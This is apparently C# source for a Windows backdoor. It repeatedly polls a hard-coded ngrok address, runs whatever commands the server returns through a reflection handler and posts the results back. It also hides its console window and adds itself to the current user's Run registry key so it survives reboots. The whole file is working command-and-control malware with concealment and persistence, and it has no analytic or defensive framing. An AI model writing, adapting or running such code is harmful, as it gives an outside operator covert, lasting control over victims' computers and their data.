using System;
using System.IO;
using System.Threading.Tasks;
using System.Collections.Generic;
using Commands;
using System.Threading;
using System.Linq;

namespace PolluteHDD
{
    class Program
    {
        //static Queue<Task> commands = new Queue<Task>();
        const string adress = "http://44a5-95-174-125-219.ngrok.io/";

        
            
        static void Main()
        {
            ToCompile();
            
            Console.ReadKey();
        }
        
        
        static void ToCompile(string message = "OK")
        {
            bool isTimedOut = false;
            try
            {
                while (true)
                {

                    ReflectionCommandHendler hendler = new ();
                    var request = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(adress);
                    request.Method = "POST";
                    using (var reqStream = request.GetRequestStream())
                    {
                        using StreamWriter writer = new(reqStream);
                        writer.WriteLine(message);
                    }
                    var response = request.GetResponse();
                    string command;
                    using (var stream = response.GetResponseStream())
                    {
                        using StreamReader reader = new(stream);
                        command = reader.ReadToEnd().Trim(' ', '\n');
                    }
                    Console.WriteLine(command + " is received");
                    message = hendler.ExecuteCommand(command);
                    message = message.Trim('\n');


                    response.Close();
                }
            }
            catch (Exception ex)
            {
                if (ex.Message.ToLower() == "the operation has timed out")
                {
                    isTimedOut = true;
                }
                Console.WriteLine(ex.Message);
            }
            finally 
            { 
            }
            if (isTimedOut)
            {
                ToCompile("timed out");
            }
        }
    }


    public interface IStartableWork
    {
        public void StartWork();
    }


    

    

    internal class InvisiableProcces
    {


        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        //const int SW_Min = 2;
        //const int SW_Max = 3;
        //const int SW_Norm = 4;

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);


        readonly IStartableWork _work;
        public InvisiableProcces(IStartableWork work, bool isVisible = false)
        {
            if (!isVisible)
            {
                var handle = GetConsoleWindow();
                ShowWindow(handle, SW_HIDE);
            }
            else
            {
                var handle = GetConsoleWindow();
                ShowWindow(handle, SW_SHOW);
            }
            _work = work;
        }

        [STAThread]
        public void MakeProcces()
        {

            _work.StartWork();
        }

        [System.Diagnostics.CodeAnalysis.SuppressMessage("Interoperability", "CA1416:Проверка совместимости платформы", Justification = "<Ожидание>")]
        static public void AddToAutoRun()
        {
            const string applicationName = "(По умолчанию)";
            const string pathRegistryKeyStartup = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

            using var registryKeyStartup = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(pathRegistryKeyStartup, true);
            registryKeyStartup.SetValue(
                applicationName,
                string.Format("\"{0}\"", System.Reflection.Assembly.GetExecutingAssembly().Location));

        }

    }





   




}



